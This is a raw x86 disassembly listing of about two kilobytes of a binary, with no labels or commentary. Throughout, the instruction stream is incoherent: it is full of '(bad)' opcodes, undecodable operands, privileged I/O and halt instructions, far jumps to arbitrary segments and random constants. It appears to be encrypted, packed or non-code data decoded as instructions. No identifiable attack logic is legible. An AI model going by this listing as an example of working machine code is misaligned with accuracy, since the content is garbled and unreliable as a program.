  4097a1:	mov    eax,ds:0x2b3d3963
  4097a6:	add    DWORD PTR [edx+0x5999860c],esp
  4097ac:	cmc    
  4097ad:	xor    DWORD PTR [esi-0x47],0x69
  4097b1:	popf   
  4097b2:	inc    esi
  4097b3:	push   esp
  4097b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b5:	jecxz  0x40976b
  4097b7:	popa   
  4097b8:	push   0xdb7a6a6e
  4097bd:	lea    ebp,[ecx-0x56]
  4097c0:	sahf   
  4097c1:	mov    ds:0x887ec89d,eax
  4097c6:	xchg   ebx,eax
  4097c7:	arpl   WORD PTR [eax+edi*1-0x11],dx
  4097cb:	mov    ebp,0x800254fc
  4097d0:	jno    0x4097cd
  4097d2:	outs   dx,BYTE PTR ds:[esi]
  4097d3:	icebp  
  4097d4:	loope  0x4097c1
  4097d6:	fidiv  DWORD PTR [edx+0x38684b28]
  4097dc:	int3   
  4097dd:	mov    cl,cl
  4097df:	pop    ebx
  4097e0:	or     eax,0xf5f292de
  4097e5:	fisubr DWORD PTR [esi]
  4097e7:	lods   al,BYTE PTR ds:[esi]
  4097e8:	stc    
  4097e9:	sub    al,0xb7
  4097eb:	je     0x409778
  4097ed:	or     BYTE PTR [eax+0x50],ch
  4097f0:	xchg   BYTE PTR [esi+ecx*1],dl
  4097f3:	or     eax,0x2f76b46c
  4097f8:	cmc    
  4097f9:	ins    BYTE PTR es:[edi],dx
  4097fa:	xor    al,0x28
  4097fc:	div    al
  4097fe:	xor    DWORD PTR [esi+0x46],esp
  409801:	xor    eax,0x45223345
  409806:	out    dx,eax
  409807:	mov    WORD PTR [ebp+esi*1+0x1d],ss
  40980b:	pop    esi
  40980c:	call   0x6bc4f72d
  409811:	out    0x3a,eax
  409813:	mov    eax,ds:0x38f908ed
  409818:	inc    esi
  409819:	push   es
  40981a:	add    DWORD PTR [esp+eiz*2-0xa0db96f],edi
  409821:	jo     0x40985f
  409823:	or     ecx,edi
  409825:	mov    al,ds:0xe5327a24
  40982a:	push   0x86f9f552
  40982f:	push   ds
  409830:	fcom   QWORD PTR [ecx-0x650a916a]
  409836:	mov    edi,0x4b2ef8a4
  40983b:	stos   DWORD PTR es:[edi],eax
  40983c:	pop    ebx
  40983d:	pop    es
  40983e:	sbb    DWORD PTR [esi+0xd5b808],edi
  409844:	add    al,0x74
  409846:	xor    eax,0xf3903e6d
  40984b:	mov    eax,0xe06bc44a
  409850:	xlat   BYTE PTR ds:[ebx]
  409851:	test   al,bh
  409853:	cmp    bh,bh
  409855:	(bad)  
  409856:	addr16 jg 0x4098a7
  409859:	cli    
  40985a:	shr    DWORD PTR [edx-0x14],cl
  40985d:	mov    ch,0xf3
  40985f:	test   al,0xc6
  409861:	clc    
  409862:	xchg   ecx,eax
  409863:	stos   DWORD PTR es:[edi],eax
  409864:	mov    eax,0x7046ea7
  409869:	popf   
  40986a:	fwait
  40986b:	jmp    0x3316:0xebb93b9a
  409872:	cld    
  409873:	ffree  st(7)
  409875:	or     ebp,DWORD PTR [esi-0x2c]
  409878:	dec    esi
  409879:	dec    ax
  40987b:	push   0x3938a679
  409880:	mov    al,ds:0xae18ebb3
  409885:	dec    edi
  409886:	rcr    DWORD PTR ds:0x67d19be4,1
  40988c:	sar    DWORD PTR [ebx],1
  40988e:	pop    esi
  40988f:	pop    ebx
  409890:	sti    
  409891:	jmp    0x60ec:0xd2c7390a
  409898:	fwait
  409899:	cmp    eax,0x7cf5a689
  40989e:	or     BYTE PTR [esi],bl
  4098a0:	imul   esp,DWORD PTR [edx],0xa42d61f2
  4098a6:	(bad)  
  4098a7:	cmp    BYTE PTR [esi+0x262ca5b1],bh
  4098ad:	or     edx,esi
  4098af:	mov    esi,0xef0cfee3
  4098b4:	mov    al,BYTE PTR [ebx+0x3829f600]
  4098ba:	test   eax,0x512f8662
  4098bf:	shl    BYTE PTR [ebx],0x6c
  4098c2:	pop    ds
  4098c3:	aam    0xf5
  4098c5:	clc    
  4098c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c7:	jl     0x40992d
  4098c9:	jle    0x4098b4
  4098cb:	fist   DWORD PTR [eax]
  4098cd:	lock xchg edx,eax
  4098cf:	cdq    
  4098d0:	cmc    
  4098d1:	or     esp,DWORD PTR [ecx+0x18]
  4098d4:	int3   
  4098d5:	repnz call 0x1b74:0xe77ae4e3
  4098dd:	std    
  4098de:	jle    0x40995f
  4098e0:	aaa    
  4098e1:	pop    eax
  4098e2:	inc    edi
  4098e3:	hlt    
  4098e4:	cmp    DWORD PTR [ebx],0x1979e941
  4098ea:	in     al,dx
  4098eb:	sub    eax,0x3f7e4dd3
  4098f0:	pop    edi
  4098f1:	jae    0x409933
  4098f3:	jp     0x40996a
  4098f5:	or     eax,0x5ed40183
  4098fa:	inc    esp
  4098fb:	cmp    al,0x27
  4098fd:	add    eax,0x405c2155
  409902:	pop    edx
  409903:	dec    edi
  409904:	std    
  409905:	fist   WORD PTR [edi-0xf]
  409908:	test   BYTE PTR [ecx+0x5b],0xcc
  40990c:	out    dx,eax
  40990d:	push   0x54a5e7cd
  409912:	fnstsw WORD PTR [eax]
  409914:	mov    ?,WORD PTR [edi+0x26]
  409917:	pop    ebx
  409918:	adc    al,0x7c
  40991a:	and    dh,BYTE PTR [esi+0x11]
  40991d:	out    dx,al
  40991e:	push   es
  40991f:	popf   
  409920:	mov    dh,0xed
  409922:	lods   al,BYTE PTR ds:[esi]
  409923:	add    al,0x92
  409925:	pop    es
  409926:	cs scas al,BYTE PTR es:[edi]
  409928:	ins    DWORD PTR es:[edi],dx
  409929:	cmp    BYTE PTR [ecx+0x3e],cl
  40992c:	and    BYTE PTR [eax-0x6f],al
  40992f:	xor    eax,0xf76cbf16
  409934:	stc    
  409935:	jmp    FWORD PTR [esi+0x1e]
  409938:	xchg   DWORD PTR [ebx],edx
  40993a:	adc    eax,0xe6c090f3
  40993f:	cmp    BYTE PTR [ecx-0x5e],dl
  409942:	cmp    BYTE PTR [esi+0x5],bl
  409945:	test   al,0x37
  409947:	sub    esi,ebp
  409949:	popa   
  40994a:	cmp    bh,BYTE PTR [ebx]
  40994c:	add    ah,BYTE PTR [esi+0x46]
  40994f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409950:	sbb    bh,BYTE PTR [eax]
  409952:	or     edi,DWORD PTR [esp+eiz*2-0x36]
  409956:	sub    al,BYTE PTR [ebx]
  409958:	(bad)  
  409959:	push   ebp
  40995a:	outs   dx,DWORD PTR ds:[esi]
  40995b:	mov    ds:0xa2661e14,eax
  409960:	pop    ebp
  409961:	ret    0x389e
  409964:	nop
  409965:	ds mov ecx,ds
  409968:	in     al,0x83
  40996a:	in     al,dx
  40996b:	nop
  40996c:	cmc    
  40996d:	data16 sbb al,0xf5
  409970:	lods   eax,DWORD PTR ds:[esi]
  409971:	xor    DWORD PTR [ebx+0x4d383910],0x64
  409978:	int    0xb2
  40997a:	aas    
  40997b:	lods   al,BYTE PTR ds:[esi]
  40997c:	or     al,0xa6
  40997e:	outs   dx,BYTE PTR ds:[esi]
  40997f:	(bad)  
  409980:	in     al,0xd0
  409982:	lahf   
  409983:	xlat   BYTE PTR ds:[ebx]
  409984:	sti    
  409985:	mov    esp,DWORD PTR [ebx]
  409987:	push   edi
  409988:	sub    al,0x38
  40998a:	inc    ebp
  40998b:	int3   
  40998c:	dec    esi
  40998d:	sbb    al,0x9c
  40998f:	aaa    
  409990:	jmp    0x409944
  409992:	pusha  
  409993:	mov    bl,0xf5
  409995:	add    ch,dl
  409997:	retf   
  409998:	rcl    BYTE PTR [edi+0x3bc89432],0x36
  40999f:	mov    ah,0x75
  4099a1:	or     ah,0xc3
  4099a4:	xchg   edx,eax
  4099a5:	adc    DWORD PTR [esi+0x10],ebp
  4099a8:	push   edi
  4099a9:	and    cl,BYTE PTR [eax-0x62]
  4099ac:	leave  
  4099ad:	push   ds
  4099ae:	fidivr WORD PTR [eax]
  4099b0:	es mov edx,0xe95a614b
  4099b6:	ds iret 
  4099b8:	in     al,dx
  4099b9:	ret    0x6384
  4099bc:	mov    DWORD PTR [edi],edx
  4099be:	pop    ds
  4099bf:	ds inc edx
  4099c1:	les    ebp,FWORD PTR [edx]
  4099c3:	lea    esp,[ecx]
  4099c5:	cmp    eax,0x4b2ab962
  4099ca:	add    al,0xb6
  4099cc:	mov    ebp,0xf5f8a52f
  4099d1:	mov    WORD PTR [ebp-0x18c92377],?
  4099d7:	(bad)  
  4099d8:	mov    bl,0xc3
  4099da:	adc    eax,0x8534e83c
  4099df:	fs aaa 
  4099e1:	dec    edi
  4099e2:	or     BYTE PTR [eax+0x7714011],cl
  4099e8:	cmc    
  4099e9:	(bad)  
  4099ea:	xor    bl,BYTE PTR [edi]
  4099ec:	jg     0x409a0e
  4099ee:	jbe    0x409a3d
  4099f0:	enter  0xe83b,0xbf
  4099f4:	call   0x6ea0:0xab17a505
  4099fb:	xchg   ebx,eax
  4099fc:	sbb    esp,DWORD PTR [ebx]
  4099fe:	leave  
  4099ff:	in     al,dx
  409a00:	mov    ebp,0x3e38e2d1
  409a05:	push   ds
  409a06:	inc    edi
  409a07:	xchg   DWORD PTR [ecx-0x624191dc],ebp
  409a0d:	imul   ebx,DWORD PTR [edi],0x31
  409a10:	cmc    
  409a11:	rcr    dl,cl
  409a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a14:	push   esp
  409a15:	int    0x3c
  409a17:	or     eax,0xe58b3be1
  409a1c:	not    BYTE PTR [esi+0x186bf4d1]
  409a22:	(bad)  
  409a23:	addr16 cmc 
  409a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a26:	and    al,BYTE PTR [edx+0x20]
  409a29:	pop    ebp
  409a2a:	xor    eax,0xdb3bfc99
  409a2f:	adc    ch,BYTE PTR [ecx-0x20]
  409a32:	mov    eax,0x1ef9128f
  409a37:	mov    al,ds:0xfd23e61c
  409a3c:	cmc    
  409a3d:	scas   al,BYTE PTR es:[edi]
  409a3e:	mov    ?,WORD PTR [edx]
  409a40:	in     eax,dx
  409a41:	sub    DWORD PTR [esi],eax
  409a43:	cmp    al,0x9e
  409a45:	inc    esi
  409a46:	mov    ecx,0x2136e088
  409a4b:	mov    ds:0x79063ef8,al
  409a50:	cmp    DWORD PTR [edx-0x7497f17e],0xfc348eee
  409a5a:	push   ds
  409a5b:	pop    es
  409a5c:	scas   eax,DWORD PTR es:[edi]
  409a5d:	cmp    esp,eax
  409a5f:	mov    ch,0xe6
  409a61:	xor    ah,BYTE PTR [ebx]
  409a63:	sbb    al,0x46
  409a65:	sub    eax,0x790bf38c
  409a6a:	outs   dx,DWORD PTR ds:[esi]
  409a6b:	or     eax,0xf9fc8c1
  409a70:	(bad)  
  409a71:	cmp    esi,edi
  409a73:	adc    ecx,esi
  409a75:	dec    esi
  409a76:	fcmovb st,st(0)
  409a78:	int3   
  409a79:	les    ebp,FWORD PTR [esi+0x33]
  409a7c:	jp     0x409ab8
  409a7e:	sub    al,0x27
  409a81:	xor    ecx,DWORD PTR [ebx+0x39]
  409a84:	mov    BYTE PTR [ebx+0x24],bh
  409a87:	adc    DWORD PTR [edi-0xa17d350],0x3bfdcf25
  409a91:	xor    ch,BYTE PTR [esi+edx*8+0x48]
  409a95:	pop    es
  409a96:	rol    BYTE PTR [eax-0x6e],cl
  409a99:	cli    
  409a9a:	xchg   esp,eax
  409a9b:	daa    
  409a9c:	cdq    
  409a9d:	mov    eax,0x8a8dd901
  409aa2:	outs   dx,BYTE PTR ds:[esi]
  409aa3:	out    dx,eax
  409aa4:	mov    esi,DWORD PTR ds:0x50f9c577
  409aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aab:	cmp    BYTE PTR [esi],dh
  409aad:	adc    ecx,ecx
  409aaf:	and    edx,eax
  409ab1:	jmp    0x3d3d:0x90f57fa1
  409ab8:	sbb    cl,BYTE PTR [ecx]
  409aba:	and    ch,bh
  409abc:	pushf  
  409abd:	cmp    al,BYTE PTR [ebx]
  409abf:	mov    edx,0x905ead3f
  409ac4:	cmp    DWORD PTR [esi+ecx*1-0x5d],ebx
  409ac8:	cmc    
  409ac9:	das    
  409aca:	sub    ecx,ecx
  409acc:	cdq    
  409acd:	lds    edi,FWORD PTR [ebp+0x51]
  409ad0:	ja     0x409b0a
  409ad2:	inc    edi
  409ad3:	inc    ebx
  409ad4:	out    dx,al
  409ad5:	xchg   ebp,eax
  409ad6:	cmp    bl,ch
  409ad8:	sub    eax,0xe1d66f77
  409add:	nop
  409ade:	adc    ebx,DWORD PTR [eax]
  409ae0:	fimul  DWORD PTR [ebp+esi*1+0x64c1ed28]
  409ae7:	clc    
  409ae8:	push   ebp
  409ae9:	mov    edx,ss
  409aeb:	out    dx,eax
  409aec:	mov    eax,0xb7136ee3
  409af1:	xchg   DWORD PTR [ecx-0x1f34530],esp
  409af7:	sub    esp,DWORD PTR [ecx+0x1567b45a]
  409afd:	xchg   esp,eax
  409aff:	in     eax,0xb2
  409b01:	int3   
  409b02:	outs   dx,BYTE PTR ds:[esi]
  409b03:	sub    eax,eax
  409b05:	mov    ds:0x3fd9373b,al
  409b0a:	jmp    0x409b44
  409b0c:	mov    ah,0x20
  409b0e:	ret    
  409b0f:	and    DWORD PTR ds:0xf5b438fe,edx
  409b15:	iret   
  409b16:	pop    edx
  409b17:	dec    edx
  409b18:	mov    edi,DWORD PTR [edi+0x3bb74708]
  409b1e:	xchg   esp,eax
  409b1f:	or     bl,dh
  409b21:	pop    ebp
  409b22:	dec    esi
  409b23:	lods   eax,DWORD PTR ds:[esi]
  409b24:	int3   
  409b25:	lock pop edx
  409b27:	std    
  409b28:	cmc    
  409b29:	ds jo  0x409b06
  409b2c:	popf   
  409b2d:	pop    esi
  409b2e:	jecxz  0x409acd
  409b30:	mov    bl,0xad
  409b32:	js     0x409b6c
  409b34:	movhps QWORD PTR [eax],xmm3
  409b37:	push   edi
  409b38:	sub    cl,al
  409b3a:	dec    esi
  409b3b:	mov    al,ch
  409b3d:	jmp    0x409b66
  409b3f:	and    al,0x88
  409b41:	pop    eax
  409b42:	mov    DWORD PTR ds:[ecx],edx
  409b45:	(bad)  
  409b46:	arpl   bx,ax
  409b48:	sbb    al,0x38
  409b4a:	cli    
  409b4b:	mov    DWORD PTR [ecx],esp
  409b4d:	xor    edi,DWORD PTR [edi+ebx*4]
  409b50:	pop    ss
  409b51:	push   ebx
  409b52:	outs   dx,DWORD PTR ds:[esi]
  409b53:	test   BYTE PTR [eax+edi*8],ah
  409b56:	or     ch,BYTE PTR [edi+0x4f]
  409b59:	add    edx,DWORD PTR [eax]
  409b5b:	cmp    DWORD PTR [eax+ecx*8],esi
  409b5e:	push   cs
  409b5f:	les    edi,FWORD PTR [edx-0xa61c1f6]
  409b65:	jp     0x409b79
  409b67:	test   BYTE PTR [edx-0x1c],0xf6
  409b6b:	imul   DWORD PTR [esi+0x38]
  409b6e:	fldcw  WORD PTR [ecx+0x520143f9]
  409b74:	sbb    edi,edx
  409b76:	imul   edx,ebx,0x903f75ab
  409b7c:	ins    BYTE PTR es:[edi],dx
  409b7d:	jnp    0x409b3c
  409b7f:	mov    edx,0x388e70f9
  409b84:	dec    edi
  409b85:	sti    
  409b86:	icebp  
  409b87:	cmp    BYTE PTR [edi-0x76],0xe6
  409b8b:	fs cmc 
  409b8d:	lods   al,BYTE PTR ds:[esi]
  409b8e:	dec    esp
  409b8f:	mov    bl,0x95
  409b91:	mov    eax,ds:0x8035b50a
  409b96:	test   DWORD PTR [ecx],edi
  409b98:	mov    bl,BYTE PTR [eax-0x36f8ac9]
  409b9e:	jg     0x409c1c
  409ba0:	xor    al,BYTE PTR [esi+ebp*2]
  409ba3:	dec    ebx
  409ba4:	int    0x96
  409ba6:	pusha  
  409ba7:	retf   0xde4d
  409baa:	jo     0x409be4
  409bac:	outs   dx,BYTE PTR ds:[esi]
  409bad:	call   0x578a:0x3dd6c94d
  409bb4:	jae    0x409bd4
  409bb6:	outs   dx,BYTE PTR ds:[esi]
  409bb7:	(bad)  
  409bb8:	xor    edi,DWORD PTR [esi+esi*8]
  409bbb:	pushf  
  409bbc:	add    bl,BYTE PTR [edi+ebx*2+0x39]
  409bc0:	mov    ds:0x513f134,al
  409bc5:	mov    ds:0xd3f5e5a5,al
  409bca:	cmp    ecx,DWORD PTR [edi]
  409bcc:	ret    0x3d0a
  409bcf:	hlt    
  409bd0:	or     edi,DWORD PTR [eax]
  409bd2:	cmp    al,0x8
  409bd4:	ret    
  409bd5:	nop
  409bd6:	test   eax,0x6edd9ba4
  409bdb:	popa   
  409bdc:	xor    BYTE PTR [edx-0x7d],0x19
  409be0:	(bad)  
  409be1:	pop    ss
  409be2:	or     eax,edx
  409be4:	dec    BYTE PTR [eax]
  409be6:	xor    BYTE PTR [ebx+0x52],ch
  409be9:	imul   ecx,DWORD PTR [ebp-0x7],0xffffffb4
  409bed:	icebp  
  409bee:	pushf  
  409bef:	mov    ch,0x9b
  409bf1:	or     bh,BYTE PTR [esi+eiz*4+0x66]
  409bf5:	mov    esp,0xd226de1a
  409bfa:	push   es
  409bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfc:	(bad)
  409bff:	inc    ebp
  409c00:	test   eax,0x4fa7bad
  409c05:	xchg   ebp,eax
  409c06:	outs   dx,BYTE PTR ds:[esi]
  409c07:	mov    al,al
  409c09:	dec    ebp
  409c0a:	hlt    
  409c0b:	dec    ebx
  409c0c:	(bad)  
  409c0d:	xor    BYTE PTR [esi+0x70],ch
  409c10:	outs   dx,BYTE PTR ds:[esi]
  409c11:	mov    al,ds:0x777f600e
  409c16:	aad    0x3f
  409c18:	fsqrt  
  409c1a:	xchg   ecx,eax
  409c1b:	pop    ecx
  409c1c:	xchg   ebx,eax
  409c1d:	stos   DWORD PTR es:[edi],eax
  409c1e:	push   ds
  409c1f:	stos   BYTE PTR es:[edi],al
  409c20:	sub    DWORD PTR [edi+0x6f],edx
  409c23:	and    ebp,DWORD PTR [ecx-0x16e02526]
  409c29:	sbb    esp,DWORD PTR [ecx+0x39]
  409c2c:	xchg   ecx,ebx
  409c2e:	pop    ebp
  409c2f:	arpl   WORD PTR [ebp-0xa8159ba],si
  409c35:	jno    0x409c78
  409c37:	outs   dx,DWORD PTR ds:[esi]
  409c38:	aas    
  409c39:	xchg   ecx,eax
  409c3a:	add    ah,dl
  409c3c:	dec    edi
  409c3d:	cmp    eax,0x7b7c013d
  409c42:	inc    edx
  409c43:	inc    ebx
  409c44:	in     al,dx
  409c45:	xor    al,0x4a
  409c47:	lds    ecx,FWORD PTR [ecx+0x67]
  409c4a:	divps  xmm0,XMMWORD PTR [edx]
  409c4d:	pop    edi
  409c4e:	out    dx,al
  409c4f:	sub    edi,DWORD PTR [edx]
  409c51:	jmp    0x4adb:0x6a751ce1
  409c58:	js     0x409c27
  409c5a:	outs   dx,BYTE PTR ds:[esi]
  409c5b:	pushf  
  409c5c:	mov    WORD PTR [ebx+0x88c8a4],?
  409c62:	pusha  
  409c63:	cmp    DWORD PTR [eax],esp
  409c65:	ja     0x409c0d
  409c67:	dec    eax
  409c68:	idiv   BYTE PTR [ecx+0x1]
  409c6b:	(bad)  
  409c6c:	cmc    
  409c6d:	adc    BYTE PTR [esp+ebp*2+0x2ed0a2c2],cl
  409c74:	jnp    0x409cae
  409c76:	xchg   esi,esp
  409c78:	repnz mov al,ds:0xe28e5ec4
  409c7e:	push   esp
  409c7f:	in     al,0xf5
  409c81:	pusha  
  409c82:	aaa    
  409c83:	add    DWORD PTR [ecx],esi
  409c85:	mov    ds:0x386fa16f,al
  409c8a:	xor    ebx,DWORD PTR [esi]
  409c8c:	or     esi,DWORD PTR [edi]
  409c8e:	dec    esp
  409c8f:	pop    ds
  409c90:	(bad)  
  409c91:	sbb    BYTE PTR [ebp+0x6b],bh
  409c94:	cs jle 0x409cd6
  409c97:	cmp    DWORD PTR [esi-0x3b0038d5],eax
  409c9d:	cmp    ecx,DWORD PTR [ecx+0x18a1e9f0]
  409ca3:	ds loop 0x409c76
  409ca6:	imul   ebp,DWORD PTR ds:0x3329a906,0xa2958820
  409cb0:	int3   
  409cb1:	pop    es
  409cb2:	aaa    
  409cb3:	shr    BYTE PTR ds:0xab34bff8,cl
  409cb9:	push   edx
  409cba:	test   BYTE PTR [esi*8+0x5bd9319b],bl
  409cc1:	loop   0x409d16
  409cc3:	pushf  
  409cc4:	or     ah,BYTE PTR [esi]
  409cc6:	sar    BYTE PTR [eax],1
  409cc8:	adc    eax,0x7574f086
  409ccd:	jmp    0x409ce7
  409ccf:	loop   0x409d04
  409cd1:	cwde   
  409cd2:	sub    BYTE PTR [eax],bl
  409cd4:	data16 xlat BYTE PTR ds:[ebx]
  409cd6:	arpl   WORD PTR [ecx],di
  409cd8:	mov    esp,0x4e9e67b2
  409cdd:	inc    esi
  409cde:	sbb    edi,DWORD PTR [ecx]
  409ce0:	ret    
  409ce1:	pop    ebp
  409ce2:	ins    BYTE PTR es:[edi],dx
  409ce3:	int3   
  409ce4:	sti    
  409ce5:	pop    eax
  409ce6:	sub    ecx,DWORD PTR [eax-0x9]
  409ce9:	mov    esi,gs
  409ceb:	sub    bl,BYTE PTR [ebx]
  409ced:	es (bad) 
  409cef:	clc    
  409cf0:	leave  
  409cf1:	adc    dh,0x50
  409cf4:	call   0xbaaccb31
  409cf9:	stos   DWORD PTR es:[edi],eax
  409cfa:	pop    es
  409cfb:	xchg   ebx,eax
  409cfc:	sbb    eax,0x4f37e54
  409d01:	(bad)  
  409d02:	iret   
  409d03:	sti    
  409d04:	sub    al,0x31
  409d06:	aas    
  409d07:	mov    eax,0x204c015
  409d0c:	jb     0x409d4b
  409d0e:	xor    al,0xb4
  409d10:	jae    0x409cbe
  409d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d13:	fsub   DWORD PTR [ebp-0x1c0b23d8]
  409d19:	jae    0x409d84
  409d1b:	rol    BYTE PTR [eax+0x495ed5db],0x98
  409d22:	lea    edi,[eax]
  409d24:	mov    bh,0x96
  409d26:	int    0x82
  409d28:	fdivr  QWORD PTR [esi]
  409d2a:	mov    bl,0xa3
  409d2c:	cmc    
  409d2d:	jmp    0x22b3e865
  409d32:	xchg   esp,eax
  409d33:	xchg   edx,eax
  409d34:	fild   WORD PTR [edi]
  409d36:	sbb    ecx,DWORD PTR [edi-0x2d]
  409d39:	lock test al,0xd4
  409d3c:	aad    0xc
  409d3e:	push   es
  409d3f:	(bad)  
  409d40:	lds    ecx,FWORD PTR [ecx+edx*8+0x56]
  409d44:	and    eax,0xf5533c10
  409d49:	mov    ebx,0x2a98b37
  409d4e:	or     bh,ah
  409d50:	(bad)  
  409d51:	cmp    esp,DWORD PTR [edi+0x24d3fd24]
  409d57:	cli    
  409d58:	fdiv   QWORD PTR [eax]
  409d5a:	outs   dx,DWORD PTR ds:[esi]
  409d5b:	jg     0x409dd2
  409d5d:	aas    
  409d5e:	inc    ecx
  409d5f:	pop    eax
  409d60:	xchg   ecx,eax
  409d61:	ficomp WORD PTR [edx+0x72]
  409d64:	dec    ecx
  409d65:	cmp    BYTE PTR [ebx-0x67385866],dh
  409d6b:	jo     0x409d5f
  409d6d:	push   ds
  409d6e:	outs   dx,BYTE PTR ds:[esi]
  409d6f:	cmp    DWORD PTR [ebx+ecx*2-0x33],esp
  409d73:	out    dx,eax
  409d74:	mov    ch,0x6b
  409d76:	jo     0x409db0
  409d78:	pop    ebp
  409d79:	cmp    DWORD PTR [esi],esp
  409d7b:	push   DWORD PTR [esp+ebx*2+0x7df58290]
  409d82:	jl     0x409d70
  409d84:	int3   
  409d85:	lea    ebp,[edx-0x6c]
  409d88:	cmp    DWORD PTR [ebx],0xc
  409d8b:	xchg   edi,eax
  409d8c:	sub    bh,ah
  409d8e:	add    esi,DWORD PTR [ebx-0x64f793bf]
  409d94:	mov    ch,0xab
  409d96:	ins    DWORD PTR es:[edi],dx
  409d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d98:	stc    
  409d99:	mov    ds:0x78ad1e9c,eax
  409d9e:	outs   dx,DWORD PTR ds:[esi]
  409d9f:	sbb    ch,BYTE PTR [esi+edi*1]
  409da2:	jecxz  0x409da4
  409da4:	pop    ds
  409da5:	cmp    dl,bh
  409da7:	int    0x4e
  409da9:	sub    al,0x62
  409dab:	fwait
  409dac:	xchg   ecx,eax
  409dad:	popf   
  409dae:	outs   dx,BYTE PTR ds:[esi]
  409daf:	dec    edi
  409db0:	mov    DWORD PTR [edi],esi
  409db2:	and    DWORD PTR [edx-0x14],ebp
  409db5:	(bad)  
  409db6:	mov    eax,es
  409db8:	xor    bh,BYTE PTR [eax]
  409dba:	in     al,dx
  409dbb:	or     dl,dh
  409dbd:	retf   0xcfc7
  409dc0:	in     eax,dx
  409dc1:	outs   dx,DWORD PTR ds:[si]
  409dc3:	jle    0x409d81
  409dc5:	scas   eax,DWORD PTR es:[edi]
  409dc6:	aaa    
  409dc7:	les    edi,FWORD PTR [edi]
  409dc9:	pop    edx
  409dca:	jmp    0x409e04
  409dcc:	fs loopne 0x409df1
  409dcf:	jae    0x409dea
  409dd1:	shl    DWORD PTR [ebx-0x4e580a2e],0x5a
  409dd8:	jmp    0x2f59ac4b
  409ddd:	cmp    bl,dh
  409ddf:	and    DWORD PTR [esi-0x3dea6237],ebp
  409de5:	ret    0x2866
  409de8:	in     al,dx
  409de9:	xor    al,0xd4
  409deb:	js     0x409e08
  409ded:	mov    cl,0xce
  409def:	sub    DWORD PTR [edx+0x2],esp
  409df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df3:	sub    bl,BYTE PTR ds:0xb54c9abc
  409df9:	xchg   esp,eax
  409dfa:	dec    ebp
  409dfb:	test   DWORD PTR [edi-0x600691e9],0xc7b6ace2
  409e05:	por    mm7,QWORD PTR [esi]
  409e08:	fwait
  409e09:	dec    ebx
  409e0a:	ja     0x409e3b
  409e0c:	sub    eax,0x5db1c87f
  409e11:	push   eax
  409e12:	fcom   QWORD PTR [edi]
  409e14:	cmc    
  409e15:	call   0xc13f:0xa1653420
  409e1c:	ss push es
  409e1e:	pop    ebp
  409e1f:	ds rol dh,cl
  409e22:	leave  
  409e23:	jae    0x409daa
  409e25:	mov    al,0x5b
  409e27:	lahf   
  409e28:	add    edx,DWORD PTR [esi-0x45009a17]
  409e2e:	push   cs
  409e2f:	in     eax,dx
  409e30:	xchg   edi,eax
  409e31:	outs   dx,WORD PTR ds:[esi]
  409e33:	push   ebx
  409e34:	jno    0x409e0d
  409e36:	ins    BYTE PTR es:[edi],dx
  409e37:	xchg   ecx,eax
  409e38:	and    bl,BYTE PTR [esi+0x2c683910]
  409e3e:	ret    0x9fb3
  409e41:	mov    ds:0x7f54bfb,al
  409e46:	clc    
  409e47:	sahf   
  409e48:	(bad)  
  409e49:	or     edx,DWORD PTR [ecx+0x7d]
  409e4c:	cwde   
  409e4d:	sub    esi,DWORD PTR [edx-0xc]
  409e50:	sbb    eax,0xf9426eb8
  409e55:	hlt    
  409e56:	xchg   ebp,eax
  409e57:	(bad)  
  409e58:	fnstsw WORD PTR [ecx+0x6f]
  409e5b:	sub    eax,0x51b70c1b
  409e60:	loop   0x409e35
  409e62:	pop    ss
  409e63:	ds loopne 0x409ed6
  409e66:	in     al,0xf6
  409e68:	in     eax,0x26
  409e6a:	sub    bl,cl
  409e6c:	mov    dl,BYTE PTR [esi+ebx*2]
  409e6f:	dec    edi
  409e70:	icebp  
  409e71:	mov    ebp,DWORD PTR [esi-0x44]
  409e74:	cli    
  409e75:	fsub   DWORD PTR [ecx+0x3082cf27]
  409e7b:	cmp    ecx,edx
  409e7d:	je     0x409e85
  409e7f:	or     eax,0xc6705d83
  409e84:	cmc    
  409e85:	and    esi,DWORD PTR [ebx+0x6f]
  409e88:	inc    eax
  409e89:	fist   WORD PTR [edx-0x3c]
  409e8c:	cmp    al,0xa5
  409e8e:	mov    ch,0x38
  409e90:	push   ebx
  409e91:	shl    DWORD PTR [edi],0x98
  409e94:	dec    esp
  409e95:	out    0xbb,eax
  409e97:	cs in  al,dx
  409e99:	xchg   ecx,eax
  409e9a:	jl     0x409f0a
  409e9c:	or     bl,dl
  409e9e:	ds daa 
  409ea0:	or     BYTE PTR [ecx+0x47],0x39
  409ea4:	mov    WORD PTR ds:0xe577585,bx
  409eab:	enter  0x8aec,0xba
  409eaf:	(bad)  
  409eb0:	cmp    ebx,DWORD PTR [esi]
  409eb2:	mov    ecx,0xcc386ae9
  409eb7:	sti    
  409eb8:	hlt    
  409eb9:	aas    
  409eba:	mul    DWORD PTR [ebp-0x68]
  409ebd:	adc    esp,DWORD PTR [ebp+0x6d]
  409ec0:	test   DWORD PTR [esp+esi*2],edi
  409ec3:	mov    al,ds:0x2e82099e
  409ec8:	add    eax,0xeaf193f9
  409ecd:	lea    ebp,[edx+edx*8]
  409ed0:	sbb    edi,DWORD PTR [eax-0x48ef32ea]
  409ed6:	test   DWORD PTR [ebx-0x1791e5c9],esi
  409edc:	jmp    0xe23b:0xc7ed9f24
  409ee3:	add    al,0x77
  409ee5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ee7:	and    ebx,DWORD PTR [ebx+0x7d]
  409eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eeb:	and    eax,0x6843826
  409ef0:	cmp    esp,DWORD PTR ds:0xaab3c643
  409ef6:	push   eax
  409ef7:	ds push ds
  409ef9:	or     cl,BYTE PTR [edi-0xa789aca]
  409eff:	push   esp
  409f00:	sbb    al,0x11
  409f02:	outs   dx,BYTE PTR ds:[esi]
